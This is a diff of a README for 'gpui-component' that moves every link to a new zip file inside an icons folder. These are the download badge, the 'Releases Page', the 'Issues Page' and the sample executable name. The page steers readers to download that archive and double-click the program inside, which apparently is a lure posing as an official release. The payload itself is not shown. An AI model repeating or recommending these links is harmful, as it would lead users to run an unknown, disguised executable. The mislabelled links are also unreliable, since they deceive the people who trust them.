@@ -1,7 +1,7 @@
 # 🎨 gpui-component - Build Beautiful Desktop Apps Easily
 
 ## 📥 Download Now
-[![Download gpui-component](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip)](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip) 
+[![Download gpui-component](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip)](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip) 
 
 ## 📖 Table of Contents
 - [📥 Download Now](#-download-now)
@@ -22,13 +22,13 @@ To run gpui-component, ensure your computer meets the following requirements:
 
 ## 💡 Usage Instructions
 1. **Download the Application**
-   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip).
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip).
 
 2. **Extract the Files** 
    After downloading, locate the downloaded file. If it is in a zipped format, right-click on it and select "Extract All" to extract its contents.
 
 3. **Run the Application**
-   After extraction, navigate to the folder where you extracted the files. Look for the executable file (for example, `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip` on Windows). Double-click it to run the application.
+   After extraction, navigate to the folder where you extracted the files. Look for the executable file (for example, `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip` on Windows). Double-click it to run the application.
 
 4. **Explore Features**
    Once the application is open, take a moment to explore its features. You can create and manage your UI components with ease using our user-friendly interface.
@@ -37,10 +37,10 @@ To run gpui-component, ensure your computer meets the following requirements:
 To get started with gpui-component, follow these steps:
 
 1. **Visit the Releases Page:** 
-   Click the link to go to the [Releases Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip). You will see a list of versions available for download.
+   Click the link to go to the [Releases Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip). You will see a list of versions available for download.
 
 2. **Select a Version:**
-   Find the latest stable version. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip`, `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip`, etc.).
+   Find the latest stable version. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip`, `https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip`, etc.).
 
 3. **Download the File:** 
    Click on the file name to download it. Your browser will handle the download automatically.
@@ -52,6 +52,6 @@ To get started with gpui-component, follow these steps:
    Now that you have installed gpui-component, you are ready to create fantastic desktop applications.
 
 ## 🤝 Support
-If you need help or have questions, please refer to the [Issues Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/story/examples/gpui-component-v3.0.zip) for assistance. You can also find helpful resources in our documentation. Your feedback is welcome as it helps us improve!
+If you need help or have questions, please refer to the [Issues Page](https://raw.githubusercontent.com/Jeanineunfavorable104/gpui-component/main/crates/assets/assets/icons/gpui_component_2.4.zip) for assistance. You can also find helpful resources in our documentation. Your feedback is welcome as it helps us improve!
 
 Thank you for choosing gpui-component. Happy developing!
